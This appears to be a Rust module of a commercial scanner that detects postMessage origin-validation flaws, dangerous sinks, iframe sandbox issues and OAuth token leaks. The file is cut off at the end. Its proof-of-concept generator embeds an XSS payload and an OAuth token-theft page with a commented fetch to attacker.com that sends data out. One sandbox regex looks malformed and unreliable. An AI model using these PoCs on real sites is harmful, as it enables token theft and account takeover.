// Copyright (c) 2026 Bountyy Oy. All rights reserved.
// This software is proprietary and confidential.

/**
 * Bountyy Oy - PostMessage Vulnerability Scanner
 * Detects cross-origin messaging security issues
 *
 * Scans for:
 * - Missing origin validation in message handlers
 * - Weak origin checks (indexOf, includes vs ===)
 * - Regex bypass vulnerabilities in origin validation
 * - Null origin acceptance
 * - Wildcard (*) in postMessage calls
 * - Dangerous data handling (eval, innerHTML, location.href)
 * - Cross-frame vulnerabilities and information leakage
 * - OAuth token theft via postMessage
 *
 * @copyright 2026 Bountyy Oy
 * @license Proprietary - Enterprise Edition
 */
use crate::detection_helpers::AppCharacteristics;
use crate::http_client::HttpClient;
use crate::types::{Confidence, ScanConfig, Severity, Vulnerability};
use anyhow::Result;
use regex::Regex;
use std::collections::HashSet;
use std::sync::Arc;
use tracing::{debug, info};

/// PostMessage vulnerability scanner for detecting cross-origin messaging issues
pub struct PostMessageVulnsScanner {
    http_client: Arc<HttpClient>,
    test_marker: String,
}

/// Detected message handler with analysis results
#[derive(Debug, Clone)]
struct MessageHandler {
    /// The raw handler code
    code: String,
    /// Type of handler (addEventListener or onmessage)
    handler_type: HandlerType,
    /// Whether origin is validated
    has_origin_check: bool,
    /// Type of origin validation if present
    origin_validation: Option<OriginValidationType>,
    /// Dangerous sinks used with message data
    dangerous_sinks: Vec<DangerousSink>,
    /// Source file/URL where handler was found
    source: String,
    /// Line number in source (approximate)
    line_hint: Option<usize>,
}

/// Type of message handler
#[derive(Debug, Clone, PartialEq)]
enum HandlerType {
    AddEventListener,
    WindowOnMessage,
    DocumentOnMessage,
}

/// Type of origin validation found
#[derive(Debug, Clone, PartialEq)]
enum OriginValidationType {
    /// Strict equality check (===)
    StrictEquality,
    /// Loose equality check (==)
    LooseEquality,
    /// indexOf check (bypassable)
    IndexOf,
    /// includes check (bypassable)
    Includes,
    /// startsWith check (bypassable in some cases)
    StartsWith,
    /// endsWith check (bypassable)
    EndsWith,
    /// Regex test (may be bypassable)
    RegexTest,
    /// Whitelist array check
    WhitelistArray,
    /// Accepts null origin
    AcceptsNull,
    /// No validation
    None,
}

/// Dangerous data sink that could lead to vulnerabilities
#[derive(Debug, Clone, PartialEq)]
enum DangerousSink {
    Eval,
    InnerHtml,
    OuterHtml,
    DocumentWrite,
    LocationHref,
    LocationAssign,
    LocationReplace,
    WindowOpen,
    SetTimeout,
    SetInterval,
    NewFunction,
    JsonParse,
    InsertAdjacentHtml,
    CreateContextualFragment,
    ScriptSrc,
    IframeSrc,
}

/// PostMessage call analysis
#[derive(Debug, Clone)]
struct PostMessageCall {
    /// Target origin used
    target_origin: String,
    /// Whether wildcard is used
    uses_wildcard: bool,
    /// Data being sent (truncated)
    data_preview: String,
    /// Source location
    source: String,
}

/// iframe analysis result
#[derive(Debug, Clone)]
struct IframeAnalysis {
    /// iframe src attribute
    src: Option<String>,
    /// sandbox attribute value
    sandbox: Option<String>,
    /// Whether sandbox allows scripts
    allows_scripts: bool,
    /// Whether sandbox allows same-origin
    allows_same_origin: bool,
    /// Whether iframe is cross-origin
    is_cross_origin: bool,
}

impl PostMessageVulnsScanner {
    pub fn new(http_client: Arc<HttpClient>) -> Self {
        let test_marker = format!("pm_{}", Self::generate_id());
        Self {
            http_client,
            test_marker,
        }
    }

    fn generate_id() -> String {
        use rand::Rng;
        let mut rng = rand::rng();
        format!("{:08x}", rng.random::<u32>())
    }

    /// Main scan entry point
    pub async fn scan(
        &self,
        url: &str,
        _config: &ScanConfig,
    ) -> Result<(Vec<Vulnerability>, usize)> {
        // License check
        if !crate::license::verify_scan_authorized() {
            return Err(anyhow::anyhow!(
                "Scan not authorized. Please check your license."
            ));
        }

        info!(
            "[PostMessage] Scanning for postMessage vulnerabilities: {}",
            url
        );

        let mut all_vulnerabilities = Vec::new();
        let mut total_tests = 0;

        // Fetch the main page
        total_tests += 1;
        let response = match self.http_client.get(url).await {
            Ok(r) => r,
            Err(e) => {
                debug!("[PostMessage] Failed to fetch {}: {}", url, e);
                return Ok((all_vulnerabilities, total_tests));
            }
        };

        // Check application characteristics for context-aware scanning
        let characteristics = AppCharacteristics::from_response(&response, url);

        // PostMessage vulnerabilities are particularly relevant for:
        // - SPAs (heavy client-side communication)
        // - Sites with widgets/embeds
        // - OAuth implementations
        // - Cross-domain integrations
        let is_high_priority = characteristics.is_spa
            || characteristics.has_oauth
            || self.has_widget_indicators(&response.body);

        if is_high_priority {
            info!("[PostMessage] High priority target detected (SPA/OAuth/widgets)");
        }

        // Step 1: Extract and analyze inline JavaScript
        total_tests += 1;
        let (inline_vulns, inline_handlers) = self.analyze_inline_scripts(&response.body, url);
        all_vulnerabilities.extend(inline_vulns);

        // Step 2: Extract external JavaScript URLs and analyze
        let js_urls = self.extract_js_urls(&response.body, url);
        for js_url in &js_urls {
            total_tests += 1;
            if let Ok(js_response) = self.http_client.get(js_url).await {
                let (js_vulns, _) = self.analyze_javascript(&js_response.body, js_url);
                all_vulnerabilities.extend(js_vulns);
            }
        }

        // Step 3: Analyze iframes for cross-frame vulnerabilities
        total_tests += 1;
        let iframe_vulns = self.analyze_iframes(&response.body, url);
        all_vulnerabilities.extend(iframe_vulns);

        // Step 4: Analyze postMessage calls
        total_tests += 1;
        let postmessage_vulns = self.analyze_postmessage_calls(&response.body, url);
        all_vulnerabilities.extend(postmessage_vulns);

        // Step 5: Check for OAuth token handling via postMessage
        if characteristics.has_oauth {
            total_tests += 1;
            let oauth_vulns = self.check_oauth_postmessage(url).await;
            all_vulnerabilities.extend(oauth_vulns);
        }

        // Step 6: Generate exploitation PoCs for confirmed vulnerabilities
        for vuln in &mut all_vulnerabilities {
            if vuln.verified {
                if let Some(poc) = self.generate_exploit_poc(&vuln) {
                    vuln.description = format!(
                        "{}\n\n**Proof of Concept:**\n```html\n{}\n```",
                        vuln.description, poc
                    );
                }
            }
        }

        info!(
            "[PostMessage] Scan complete: {} tests, {} vulnerabilities found",
            total_tests,
            all_vulnerabilities.len()
        );

        Ok((all_vulnerabilities, total_tests))
    }

    /// Scan with additional JavaScript content from other sources
    pub async fn scan_with_js(
        &self,
        url: &str,
        additional_js: &[String],
        _config: &ScanConfig,
    ) -> Result<(Vec<Vulnerability>, usize)> {
        // License check
        if !crate::license::verify_scan_authorized() {
            return Err(anyhow::anyhow!(
                "Scan not authorized. Please check your license."
            ));
        }

        let (mut vulns, mut tests) = self.scan(url, _config).await?;

        // Analyze additional JavaScript
        for js_content in additional_js {
            tests += 1;
            let (js_vulns, _) = self.analyze_javascript(js_content, url);
            vulns.extend(js_vulns);
        }

        Ok((vulns, tests))
    }

    /// Check if the page has widget/embed indicators
    fn has_widget_indicators(&self, body: &str) -> bool {
        let indicators = [
            "postMessage",
            "iframe",
            "widget",
            "embed",
            "sdk.js",
            "platform.js",
            "connect.js",
            "facebook.net",
            "twitter.com/widgets",
            "google.com/recaptcha",
            "stripe.js",
            "paypal",
        ];

        let body_lower = body.to_lowercase();
        indicators.iter().any(|i| body_lower.contains(i))
    }

    /// Analyze inline scripts in HTML
    fn analyze_inline_scripts(
        &self,
        html: &str,
        source_url: &str,
    ) -> (Vec<Vulnerability>, Vec<MessageHandler>) {
        let mut vulnerabilities = Vec::new();
        let mut handlers = Vec::new();

        // Extract inline script contents
        let script_regex = Regex::new(r"(?is)<script[^>]*>(.*?)</script>").unwrap();

        for capture in script_regex.captures_iter(html) {
            if let Some(script_content) = capture.get(1) {
                let (vulns, script_handlers) =
                    self.analyze_javascript(script_content.as_str(), source_url);
                vulnerabilities.extend(vulns);
                handlers.extend(script_handlers);
            }
        }

        (vulnerabilities, handlers)
    }

    /// Core JavaScript analysis for postMessage patterns
    fn analyze_javascript(
        &self,
        js: &str,
        source: &str,
    ) -> (Vec<Vulnerability>, Vec<MessageHandler>) {
        let mut vulnerabilities = Vec::new();
        let mut handlers = Vec::new();

        // Find message handlers
        let found_handlers = self.find_message_handlers(js, source);

        for handler in &found_handlers {
            // Analyze each handler for vulnerabilities
            if let Some(vuln) = self.analyze_handler(handler, source) {
                vulnerabilities.push(vuln);
            }
            handlers.push(handler.clone());
        }

        // Also check for postMessage calls with wildcards
        let call_vulns = self.analyze_postmessage_calls(js, source);
        vulnerabilities.extend(call_vulns);

        (vulnerabilities, handlers)
    }

    /// Find all message event handlers in JavaScript code
    fn find_message_handlers(&self, js: &str, source: &str) -> Vec<MessageHandler> {
        let mut handlers = Vec::new();

        // Pattern 1: addEventListener('message', ...) or addEventListener("message", ...)
        let add_listener_regex = Regex::new(
            r#"(?is)\.addEventListener\s*\(\s*['"]message['"]\s*,\s*(function\s*\([^)]*\)\s*\{[^}]*(?:\{[^}]*\}[^}]*)*\}|[a-zA-Z_$][a-zA-Z0-9_$]*|\([^)]*\)\s*=>\s*\{[^}]*(?:\{[^}]*\}[^}]*)*\})"#
        ).unwrap();

        // Pattern 2: window.onmessage = function...
        let onmessage_regex = Regex::new(
            r#"(?is)window\s*\.\s*onmessage\s*=\s*(function\s*\([^)]*\)\s*\{[^}]*(?:\{[^}]*\}[^}]*)*\}|\([^)]*\)\s*=>\s*\{[^}]*(?:\{[^}]*\}[^}]*)*\})"#
        ).unwrap();

        // Extended pattern for more complex handlers
        let extended_handler_regex =
            Regex::new(r#"(?is)addEventListener\s*\(\s*['"]message['"][^)]*\)"#).unwrap();

        // Find addEventListener handlers
        for cap in add_listener_regex.captures_iter(js) {
            let full_match = cap.get(0).map(|m| m.as_str()).unwrap_or("");
            let handler_body = cap.get(1).map(|m| m.as_str()).unwrap_or(full_match);

            // Get surrounding context for better analysis
            let context = self.get_handler_context(js, full_match);

            let handler =
                self.create_handler_analysis(&context, HandlerType::AddEventListener, source);
            handlers.push(handler);
        }

        // Find extended patterns if basic ones didn't match
        if handlers.is_empty() {
            for cap in extended_handler_regex.captures_iter(js) {
                let position = cap.get(0).map(|m| m.start()).unwrap_or(0);
                let context = self.get_context_at_position(js, position, 2000);

                let handler =
                    self.create_handler_analysis(&context, HandlerType::AddEventListener, source);
                handlers.push(handler);
            }
        }

        // Find window.onmessage handlers
        for cap in onmessage_regex.captures_iter(js) {
            let full_match = cap.get(0).map(|m| m.as_str()).unwrap_or("");
            let context = self.get_handler_context(js, full_match);

            let handler =
                self.create_handler_analysis(&context, HandlerType::WindowOnMessage, source);
            handlers.push(handler);
        }

        handlers
    }

    /// Get surrounding context for a handler match
    fn get_handler_context(&self, js: &str, handler_match: &str) -> String {
        if let Some(pos) = js.find(handler_match) {
            self.get_context_at_position(js, pos, 2000)
        } else {
            handler_match.to_string()
        }
    }

    /// Get context at a specific position with a given window size
    fn get_context_at_position(&self, js: &str, position: usize, window: usize) -> String {
        let start = position.saturating_sub(100);
        let end = (position + window).min(js.len());
        js[start..end].to_string()
    }

    /// Create a handler analysis from code
    fn create_handler_analysis(
        &self,
        code: &str,
        handler_type: HandlerType,
        source: &str,
    ) -> MessageHandler {
        let code_lower = code.to_lowercase();

        // Check for origin validation
        let (has_origin_check, origin_validation) = self.detect_origin_validation(code);

        // Check for dangerous sinks
        let dangerous_sinks = self.detect_dangerous_sinks(code);

        MessageHandler {
            code: code.chars().take(1000).collect(), // Truncate for storage
            handler_type,
            has_origin_check,
            origin_validation,
            dangerous_sinks,
            source: source.to_string(),
            line_hint: None,
        }
    }

    /// Detect origin validation patterns
    fn detect_origin_validation(&self, code: &str) -> (bool, Option<OriginValidationType>) {
        let code_lower = code.to_lowercase();

        // Check for origin references
        if !code_lower.contains(".origin") && !code_lower.contains("origin") {
            return (false, Some(OriginValidationType::None));
        }

        // Pattern: e.origin === "https://..." or event.origin === "..."
        if Regex::new(r#"(?i)\.origin\s*===\s*['"]https?://"#)
            .unwrap()
            .is_match(code)
        {
            return (true, Some(OriginValidationType::StrictEquality));
        }

        // Pattern: e.origin == "https://..." (loose equality)
        if Regex::new(r#"(?i)\.origin\s*==\s*['"]https?://"#)
            .unwrap()
            .is_match(code)
        {
            return (true, Some(OriginValidationType::LooseEquality));
        }

        // Pattern: e.origin.indexOf(...) - VULNERABLE
        if Regex::new(r"(?i)\.origin\.indexOf\s*\(")
            .unwrap()
            .is_match(code)
        {
            return (true, Some(OriginValidationType::IndexOf));
        }

        // Pattern: e.origin.includes(...) - VULNERABLE
        if Regex::new(r"(?i)\.origin\.includes\s*\(")
            .unwrap()
            .is_match(code)
        {
            return (true, Some(OriginValidationType::Includes));
        }

        // Pattern: e.origin.startsWith(...) - POTENTIALLY VULNERABLE
        if Regex::new(r"(?i)\.origin\.startsWith\s*\(")
            .unwrap()
            .is_match(code)
        {
            return (true, Some(OriginValidationType::StartsWith));
        }

        // Pattern: e.origin.endsWith(...) - VULNERABLE
        if Regex::new(r"(?i)\.origin\.endsWith\s*\(")
            .unwrap()
            .is_match(code)
        {
            return (true, Some(OriginValidationType::EndsWith));
        }

        // Pattern: /regex/.test(e.origin) - MAY BE VULNERABLE
        if Regex::new(r"(?i)/[^/]+/\.test\s*\([^)]*\.origin")
            .unwrap()
            .is_match(code)
        {
            return (true, Some(OriginValidationType::RegexTest));
        }

        // Pattern: allowedOrigins.includes(e.origin) or whitelist check
        if Regex::new(r"(?i)(allowed|whitelist|trusted)[a-zA-Z]*\.includes\s*\([^)]*\.origin")
            .unwrap()
            .is_match(code)
        {
            return (true, Some(OriginValidationType::WhitelistArray));
        }

        // Pattern: origin === "null" or origin === null - VULNERABLE
        if Regex::new(r#"(?i)\.origin\s*===?\s*['"]?null['"]?"#)
            .unwrap()
            .is_match(code)
        {
            return (true, Some(OriginValidationType::AcceptsNull));
        }

        // Origin is mentioned but no clear validation pattern
        if code_lower.contains(".origin") {
            return (true, None);
        }

        (false, Some(OriginValidationType::None))
    }

    /// Detect dangerous data sinks in handler code
    fn detect_dangerous_sinks(&self, code: &str) -> Vec<DangerousSink> {
        let mut sinks = Vec::new();
        let code_lower = code.to_lowercase();

        // eval() with message data
        if Regex::new(r"(?i)eval\s*\([^)]*\.(data|message)")
            .unwrap()
            .is_match(code)
            || Regex::new(r"(?i)eval\s*\(\s*e\s*\)")
                .unwrap()
                .is_match(code)
            || (code_lower.contains("eval(") && code_lower.contains(".data"))
        {
            sinks.push(DangerousSink::Eval);
        }

        // innerHTML with message data
        if Regex::new(r"(?i)\.innerHTML\s*=").unwrap().is_match(code)
            && (code_lower.contains(".data") || code_lower.contains("message"))
        {
            sinks.push(DangerousSink::InnerHtml);
        }

        // outerHTML with message data
        if Regex::new(r"(?i)\.outerHTML\s*=").unwrap().is_match(code)
            && (code_lower.contains(".data") || code_lower.contains("message"))
        {
            sinks.push(DangerousSink::OuterHtml);
        }

        // document.write with message data
        if code_lower.contains("document.write") && code_lower.contains(".data") {
            sinks.push(DangerousSink::DocumentWrite);
        }

        // location.href with message data
        if Regex::new(r"(?i)location\s*\.\s*href\s*=")
            .unwrap()
            .is_match(code)
            && code_lower.contains(".data")
        {
            sinks.push(DangerousSink::LocationHref);
        }

        // location.assign with message data
        if code_lower.contains("location.assign") && code_lower.contains(".data") {
            sinks.push(DangerousSink::LocationAssign);
        }

        // location.replace with message data
        if code_lower.contains("location.replace") && code_lower.contains(".data") {
            sinks.push(DangerousSink::LocationReplace);
        }

        // window.open with message data
        if code_lower.contains("window.open") && code_lower.contains(".data") {
            sinks.push(DangerousSink::WindowOpen);
        }

        // setTimeout with message data (string eval)
        if Regex::new(r"(?i)setTimeout\s*\([^)]*\.(data|message)")
            .unwrap()
            .is_match(code)
        {
            sinks.push(DangerousSink::SetTimeout);
        }

        // setInterval with message data
        if Regex::new(r"(?i)setInterval\s*\([^)]*\.(data|message)")
            .unwrap()
            .is_match(code)
        {
            sinks.push(DangerousSink::SetInterval);
        }

        // new Function with message data
        if code_lower.contains("new function") && code_lower.contains(".data") {
            sinks.push(DangerousSink::NewFunction);
        }

        // JSON.parse without try-catch (can cause DoS)
        if code_lower.contains("json.parse") && !code_lower.contains("try") {
            sinks.push(DangerousSink::JsonParse);
        }

        // insertAdjacentHTML with message data
        if code_lower.contains("insertadjacenthtml") && code_lower.contains(".data") {
            sinks.push(DangerousSink::InsertAdjacentHtml);
        }

        // createContextualFragment with message data
        if code_lower.contains("createcontextualfragment") && code_lower.contains(".data") {
            sinks.push(DangerousSink::CreateContextualFragment);
        }

        // script.src with message data
        if Regex::new(r"(?i)script\s*\.\s*src\s*=")
            .unwrap()
            .is_match(code)
            && code_lower.contains(".data")
        {
            sinks.push(DangerousSink::ScriptSrc);
        }

        // iframe.src with message data
        if Regex::new(r"(?i)iframe\s*\.\s*src\s*=")
            .unwrap()
            .is_match(code)
            && code_lower.contains(".data")
        {
            sinks.push(DangerousSink::IframeSrc);
        }

        sinks
    }

    /// Analyze a handler and generate vulnerability if applicable
    fn analyze_handler(&self, handler: &MessageHandler, url: &str) -> Option<Vulnerability> {
        let mut issues: Vec<String> = Vec::new();
        let mut severity = Severity::Medium;
        let mut cwe = "CWE-346"; // Origin Validation Error

        // Check 1: No origin validation
        if !handler.has_origin_check {
            issues.push("No origin validation - accepts messages from any origin".to_string());
            severity = Severity::High;
        }

        // Check 2: Weak origin validation
        if let Some(ref validation) = handler.origin_validation {
            match validation {
                OriginValidationType::IndexOf => {
                    issues.push("Weak origin check using indexOf() - bypassable with attacker.com?trusted.com".to_string());
                    severity = Severity::High;
                }
                OriginValidationType::Includes => {
                    issues.push("Weak origin check using includes() - bypassable with subdomain or query string".to_string());
                    severity = Severity::High;
                }
                OriginValidationType::EndsWith => {
                    issues.push(
                        "Weak origin check using endsWith() - bypassable with attackertrusted.com"
                            .to_string(),
                    );
                    severity = Severity::High;
                }
                OriginValidationType::StartsWith => {
                    issues.push("Origin check using startsWith() - may be bypassable if not checking full origin".to_string());
                    severity = Severity::Medium;
                }
                OriginValidationType::RegexTest => {
                    issues.push("Regex-based origin validation - verify regex is properly anchored (^ and $)".to_string());
                    severity = Severity::Medium;
                }
                OriginValidationType::AcceptsNull => {
                    issues.push(
                        "Accepts 'null' origin - exploitable via sandboxed iframe or data: URL"
                            .to_string(),
                    );
                    severity = Severity::High;
                }
                OriginValidationType::LooseEquality => {
                    issues.push("Uses loose equality (==) for origin comparison - use strict equality (===)".to_string());
                    severity = Severity::Low;
                }
                OriginValidationType::None => {
                    issues.push("No origin validation detected".to_string());
                    severity = Severity::High;
                }
                _ => {}
            }
        }

        // Check 3: Dangerous sinks (escalates severity)
        if !handler.dangerous_sinks.is_empty() {
            let sink_names: Vec<String> = handler
                .dangerous_sinks
                .iter()
                .map(|s| format!("{:?}", s))
                .collect();
            issues.push(format!(
                "Dangerous data sinks detected: {}",
                sink_names.join(", ")
            ));

            // Eval or innerHTML with no/weak origin check = Critical
            if handler.dangerous_sinks.contains(&DangerousSink::Eval)
                || handler.dangerous_sinks.contains(&DangerousSink::InnerHtml)
                || handler
                    .dangerous_sinks
                    .contains(&DangerousSink::DocumentWrite)
            {
                if !handler.has_origin_check
                    || matches!(
                        handler.origin_validation,
                        Some(OriginValidationType::IndexOf)
                            | Some(OriginValidationType::Includes)
                            | Some(OriginValidationType::None)
                    )
                {
                    severity = Severity::Critical;
                    cwe = "CWE-79"; // XSS
                }
            }

            // Location-based sinks can lead to open redirect
            if handler
                .dangerous_sinks
                .contains(&DangerousSink::LocationHref)
                || handler
                    .dangerous_sinks
                    .contains(&DangerousSink::LocationAssign)
                || handler
                    .dangerous_sinks
                    .contains(&DangerousSink::LocationReplace)
            {
                if severity != Severity::Critical {
                    severity = Severity::High;
                }
            }
        }

        if issues.is_empty() {
            return None;
        }

        let vuln_type = if cwe == "CWE-79" {
            "PostMessage XSS"
        } else {
            "PostMessage Origin Validation"
        };

        Some(self.create_vulnerability(
            url,
            vuln_type,
            &issues.join("\n- "),
            &handler.code.chars().take(500).collect::<String>(),
            severity,
            cwe,
            handler.has_origin_check && !handler.dangerous_sinks.is_empty(),
        ))
    }

    /// Analyze postMessage() calls for wildcard usage
    fn analyze_postmessage_calls(&self, js: &str, source: &str) -> Vec<Vulnerability> {
        let mut vulnerabilities = Vec::new();

        // Pattern: .postMessage(..., "*")
        let wildcard_regex =
            Regex::new(r#"(?i)\.postMessage\s*\([^)]+,\s*['"]?\*['"]?\s*\)"#).unwrap();

        for cap in wildcard_regex.captures_iter(js) {
            let matched = cap.get(0).map(|m| m.as_str()).unwrap_or("");

            vulnerabilities.push(self.create_vulnerability(
                source,
                "PostMessage Wildcard Target",
                "postMessage() called with wildcard (*) target origin. This sends data to any origin, potentially leaking sensitive information.",
                matched,
                Severity::Medium,
                "CWE-346",
                true,
            ));
        }

        // Pattern: postMessage with sensitive data and wildcard
        let sensitive_wildcard_regex = Regex::new(
            r#"(?i)\.postMessage\s*\([^)]*(?:token|auth|session|password|secret|key|credential)[^)]*,\s*['"]?\*['"]?\s*\)"#
        ).unwrap();

        for cap in sensitive_wildcard_regex.captures_iter(js) {
            let matched = cap.get(0).map(|m| m.as_str()).unwrap_or("");

            vulnerabilities.push(self.create_vulnerability(
                source,
                "Sensitive Data via PostMessage Wildcard",
                "Potentially sensitive data (token/auth/session/credential) sent via postMessage with wildcard origin. This may leak authentication tokens or sensitive information.",
                matched,
                Severity::High,
                "CWE-200", // Information Exposure
                true,
            ));
        }

        vulnerabilities
    }

    /// Analyze iframes for cross-frame vulnerabilities
    fn analyze_iframes(&self, html: &str, source: &str) -> Vec<Vulnerability> {
        let mut vulnerabilities = Vec::new();

        // Find all iframes
        let iframe_regex = Regex::new(r#"(?is)<iframe[^>]*>"#).unwrap();

        for cap in iframe_regex.captures_iter(html) {
            let iframe_tag = cap.get(0).map(|m| m.as_str()).unwrap_or("");
            let analysis = self.analyze_iframe_tag(iframe_tag, source);

            // Check for sandbox bypass potential
            if analysis.allows_scripts && analysis.allows_same_origin {
                vulnerabilities.push(self.create_vulnerability(
                    source,
                    "Iframe Sandbox Misconfiguration",
                    "Iframe sandbox allows both 'allow-scripts' and 'allow-same-origin'. This combination effectively disables the sandbox as the framed content can remove the sandbox attribute.",
                    iframe_tag,
                    Severity::Medium,
                    "CWE-1021",
                    true,
                ));
            }

            // Check for cross-origin iframe without sandbox
            if analysis.is_cross_origin && analysis.sandbox.is_none() {
                vulnerabilities.push(self.create_vulnerability(
                    source,
                    "Cross-Origin Iframe Without Sandbox",
                    "Cross-origin iframe loaded without sandbox attribute. Consider adding sandbox attribute to limit iframe capabilities.",
                    iframe_tag,
                    Severity::Low,
                    "CWE-1021",
                    false,
                ));
            }
        }

        vulnerabilities
    }

    /// Analyze a single iframe tag
    fn analyze_iframe_tag(&self, iframe_tag: &str, parent_url: &str) -> IframeAnalysis {
        // Extract src
        let src_regex = Regex::new(r#"(?i)src\s*=\s*['"]([^'"]+)['"]"#).unwrap();
        let src = src_regex
            .captures(iframe_tag)
            .and_then(|c| c.get(1))
            .map(|m| m.as_str().to_string());

        // Extract sandbox
        let sandbox_regex = Regex::new(r#"(?i)sandbox\s*=\s*['"]([^'"]*)['"#).unwrap();
        let sandbox = sandbox_regex
            .captures(iframe_tag)
            .and_then(|c| c.get(1))
            .map(|m| m.as_str().to_string());

        let sandbox_lower = sandbox
            .as_ref()
            .map(|s| s.to_lowercase())
            .unwrap_or_default();
        let allows_scripts = sandbox_lower.contains("allow-scripts");
        let allows_same_origin = sandbox_lower.contains("allow-same-origin");

        // Check if cross-origin
        let is_cross_origin = if let Some(ref iframe_src) = src {
            self.is_cross_origin(parent_url, iframe_src)
        } else {
            false
        };

        IframeAnalysis {
            src,
            sandbox,
            allows_scripts,
            allows_same_origin,
            is_cross_origin,
        }
    }

    /// Check if two URLs are cross-origin
    fn is_cross_origin(&self, url1: &str, url2: &str) -> bool {
        let parsed1 = match url::Url::parse(url1) {
            Ok(u) => u,
            Err(_) => return false,
        };

        // Handle relative URLs
        let parsed2 = match url::Url::parse(url2) {
            Ok(u) => u,
            Err(_) => {
                // Try as relative URL
                match parsed1.join(url2) {
                    Ok(u) => u,
                    Err(_) => return false,
                }
            }
        };

        // Check scheme, host, port
        parsed1.scheme() != parsed2.scheme()
            || parsed1.host_str() != parsed2.host_str()
            || parsed1.port() != parsed2.port()
    }

    /// Extract JavaScript URLs from HTML
    fn extract_js_urls(&self, html: &str, base_url: &str) -> Vec<String> {
        let mut urls = HashSet::new();

        let script_regex = Regex::new(r#"(?i)<script[^>]+src\s*=\s*['"]([^'"]+)['"]"#).unwrap();

        let base = url::Url::parse(base_url).ok();

        for cap in script_regex.captures_iter(html) {
            if let Some(src) = cap.get(1) {
                let src_str = src.as_str();

                // Skip third-party scripts
                if self.is_third_party_script(src_str) {
                    continue;
                }

                // Resolve relative URLs
                let full_url = if src_str.starts_with("http://") || src_str.starts_with("https://")
                {
                    src_str.to_string()
                } else if let Some(ref base) = base {
                    base.join(src_str)
                        .map(|u| u.to_string())
                        .unwrap_or_default()
                } else {
                    continue;
                };

                if !full_url.is_empty() {
                    urls.insert(full_url);
                }
            }
        }

        urls.into_iter().collect()
    }

    /// Check if script URL is from third-party
    fn is_third_party_script(&self, url: &str) -> bool {
        let third_party_domains = [
            "google-analytics.com",
            "googletagmanager.com",
            "facebook.net",
            "twitter.com",
            "cdn.jsdelivr.net",
            "cdnjs.cloudflare.com",
            "ajax.googleapis.com",
            "unpkg.com",
        ];

        let url_lower = url.to_lowercase();
        third_party_domains.iter().any(|d| url_lower.contains(d))
    }

    /// Check for OAuth token handling via postMessage
    async fn check_oauth_postmessage(&self, url: &str) -> Vec<Vulnerability> {
        let mut vulnerabilities = Vec::new();

        // Common OAuth callback endpoints
        let oauth_paths = [
            "/oauth/callback",
            "/auth/callback",
            "/callback",
            "/oauth/authorize",
            "/auth/authorize",
        ];

        let base = match url::Url::parse(url) {
            Ok(u) => u,
            Err(_) => return vulnerabilities,
        };

        for path in oauth_paths {
            let callback_url = match base.join(path) {
                Ok(u) => u.to_string(),
                Err(_) => continue,
            };

            if let Ok(response) = self.http_client.get(&callback_url).await {
                // Check if page handles OAuth tokens via postMessage
                let body = &response.body;
                let body_lower = body.to_lowercase();

                if body_lower.contains("postmessage")
                    && (body_lower.contains("access_token")
                        || body_lower.contains("id_token")
                        || body_lower.contains("authorization_code"))
                {
                    // Check for wildcard origin
                    if body.contains("'*'") || body.contains("\"*\"") {
                        vulnerabilities.push(self.create_vulnerability(
                            &callback_url,
                            "OAuth Token Leak via PostMessage",
                            "OAuth callback page sends tokens via postMessage with wildcard origin. An attacker can create a malicious page that embeds this callback and steal OAuth tokens.",
                            &format!("Endpoint: {}", callback_url),
                            Severity::Critical,
                            "CWE-346",
                            true,
                        ));
                    }

                    // Check for weak origin validation
                    if Regex::new(r"(?i)origin\s*\.\s*indexOf")
                        .unwrap()
                        .is_match(body)
                        || Regex::new(r"(?i)origin\s*\.\s*includes")
                            .unwrap()
                            .is_match(body)
                    {
                        vulnerabilities.push(self.create_vulnerability(
                            &callback_url,
                            "OAuth Token Leak - Weak Origin Validation",
                            "OAuth callback page sends tokens via postMessage with weak origin validation (indexOf/includes). This can be bypassed to steal tokens.",
                            &format!("Endpoint: {}", callback_url),
                            Severity::High,
                            "CWE-346",
                            true,
                        ));
                    }
                }
            }
        }

        vulnerabilities
    }

    /// Generate exploitation PoC for a vulnerability
    fn generate_exploit_poc(&self, vuln: &Vulnerability) -> Option<String> {
        let target_url = &vuln.url;

        if vuln.vuln_type.contains("XSS") {
            // XSS PoC
            Some(format!(
                r#"<!DOCTYPE html>
<html>
<head><title>PostMessage XSS PoC</title></head>
<body>
<h1>PostMessage XSS Proof of Concept</h1>
<iframe id="target" src="{}" style="width:100%;height:400px;"></iframe>
<script>
// Wait for iframe to load
document.getElementById('target').onload = function() {{
    // Send malicious payload via postMessage
    var payload = '<img src=x onerror=alert(document.domain)>';
    this.contentWindow.postMessage(payload, '*');
    console.log('Payload sent: ' + payload);
}};
</script>
</body>
</html>"#,
                target_url
            ))
        } else if vuln.vuln_type.contains("OAuth") {
            // OAuth token theft PoC
            Some(format!(
                r#"<!DOCTYPE html>
<html>
<head><title>OAuth Token Theft PoC</title></head>
<body>
<h1>OAuth Token Theft Proof of Concept</h1>
<iframe id="oauth" src="{}" style="display:none;"></iframe>
<div id="stolen"></div>
<script>
window.addEventListener('message', function(e) {{
    // Capture any tokens sent via postMessage
    console.log('Received message from:', e.origin);
    console.log('Data:', e.data);

    // Display stolen data
    document.getElementById('stolen').innerHTML =
        '<h2>Captured Data:</h2><pre>' + JSON.stringify(e.data, null, 2) + '</pre>';

    // In real attack, send to attacker server:
    // fetch('https://attacker.com/steal?data=' + encodeURIComponent(JSON.stringify(e.data)));
}});
</script>
</body>
</html>"#,
                target_url
            ))
        } else if vuln.vuln_type.contains("Wildcard") {
            // Data exfiltration PoC
            Some(format!(
                r#"<!DOCTYPE html>
<html>
<head><title>PostMessage Data Capture PoC</title></head>
<body>
<h1>PostMessage Data Capture Proof of Concept</h1>
<p>This page captures data sent via postMessage with wildcard origin.</p>
<iframe id="target" src="{}" style="width:100%;height:400px;"></iframe>
<div id="captured"></div>
<script>
window.addEventListener('message', function(e) {{
    console.log('Captured message from:', e.origin);
    console.log('Data:', e.data);

    var div = document.getElementById('captured');
    div.innerHTML += '<div><strong>From:</strong> ' + e.origin +
        '<br><strong>Data:</strong> <pre>' +
        (typeof e.data === 'object' ? JSON.stringify(e.data, null, 2) : e.data) +
        '</pre></div><hr>';
}});
</script>
</body>
</html>"#,
                target_url
            ))
        } else {
            None
        }
    }

    /// Create a vulnerability record
    fn create_vulnerability(
        &self,
        url: &str,
        vuln_type: &str,
        description: &str,
        evidence: &str,
        severity: Severity,
        cwe: &str,
        verified: bool,
    ) -> Vulnerability {
        let confidence = if verified {
            Confidence::High
        } else {
            Confidence::Medium
        };

        let cvss = match &severity {
            Severity::Critical => 9.8,
            Severity::High => 8.1,
            Severity::Medium => 5.3,
